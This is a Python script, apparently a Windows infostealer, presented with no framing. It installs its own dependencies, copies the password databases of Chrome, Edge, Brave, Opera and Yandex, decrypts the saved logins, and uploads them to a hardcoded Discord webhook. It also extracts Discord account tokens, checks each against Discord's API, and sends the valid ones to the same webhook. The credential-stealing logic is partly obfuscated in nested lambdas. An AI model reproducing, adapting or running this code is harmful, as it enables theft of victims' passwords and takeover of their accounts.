import subprocess
import sys

# List of required modules
required_modules = ["requests", "pycryptodome"]

# Install the modules if not already installed
for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", module])
hook='https://canary.discord.com/api/webhooks/1323223226716786738/VtSunsRbDdhbfFBaE7xTaFmvfDh-cfXgzRmgKZKJFKMGag80XX-Wr8dGkwH7LjndwUFW'
import os,threading,random,shutil,json,base64,requests,re
from Crypto.Cipher import AES
from sqlite3 import connect as sql_connect
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
class data_structure(Structure):_fields_=[('cbData',wintypes.DWORD),('pbData',POINTER(c_char))]
buffer_data_structure = (lambda u:(c:=int(u.cbData),p:=u.pbData,b:=c_buffer(c),cdll.msvcrt.memcpy(b, p, c),windll.kernel32.LocalFree(p),b.raw)[-1])
crypt_unprotected_data = (lambda e, n=b'': (lambda b=data_structure(): buffer_data_structure(b) if windll.crypt32.CryptUnprotectData(byref(data_structure(len(e), c_buffer(e, len(e)))), None, byref(data_structure(len(n), c_buffer(n, len(n)))), None, None, 0x01, byref(b)) else None)())
decrypt_value = (lambda buff, master_key=None: (lambda starts=buff.decode('utf8', 'ignore')[:3], iv=buff[3:15], payload=buff[15:], cipher=AES.new(master_key, AES.MODE_GCM, buff[3:15]): cipher.decrypt(payload)[:-16].decode() if starts in {'v10', 'v11'} else None)())
browser_paths = [
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
]

discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
]
def send_text_file_to_webhook(webhook_url, content, filename="message.txt"):
    with open(filename, "w") as file:
        file.write(content)
            
            # Prepare the file to send
    with open(filename, "rb") as file:
        files = {
            "file": (filename, file)
        }
        response = requests.post(webhook_url, files=files)
def get_pwd(p, arg):
    try:
        return (g:=(urls:=[],usernames:=[],passwords:=[],[f:=temp+"cr"+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+".db",shutil.copy2(p+arg+"/Login Data",f),c:=sql_connect(f),k:=c.cursor(),k.execute("SELECT action_url, username_value, password_value FROM logins;"),d:=k.fetchall(),k.close(),c.close(),os.remove(f)],[[urls.append(row[0]),usernames.append(row[1]),passwords.append(decrypt_value(row[2], crypt_unprotected_data(__import__('base64').b64decode(__import__('json').loads(open(p+"/Local State",'r',encoding='utf-8').read())['os_crypt']['encrypted_key'])[5:])))]if row[0]!=''else None for row in d],('\n'.join([(f"| {urls[_]}"+(" "*(len(max(urls,key=len))-len(urls[_])+5))+f"| {usernames[_]}"+(" "*(len(max(usernames,key=len))-len(usernames[_])+5))+f"| {passwords[_]}"+(" "*(len(max(passwords,key=len))-len(passwords[_])+5))+'|')for _ in range(len(urls))])))[-1],([_ if (os.path.exists(p) and os.stat(p+arg+"/Login Data").st_size != 0)else''for _ in[g]][-1]))[-1]
    except Exception as e:
        eval('0')
for patt in browser_paths: 
    send_text_file_to_webhook(hook,str(get_pwd(patt[0], patt[3])),filename=patt[1].replace('exe','txt'))
def get_discord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return
    pathC = path + arg
    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = crypt_unprotected_data(master_key[5:])
    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for t0k3n in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0k3ns
                    t0k3nDecoded = decrypt_value(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
                    valid = requests.get("https://discord.com/api/v10/users/@me",headers={"Authorization": t0k3nDecoded}).ok
                    if valid:
                        send_text_file_to_webhook(hook,t0k3nDecoded)
for patt in discordPaths:
    get_discord(patt[0], patt[1])
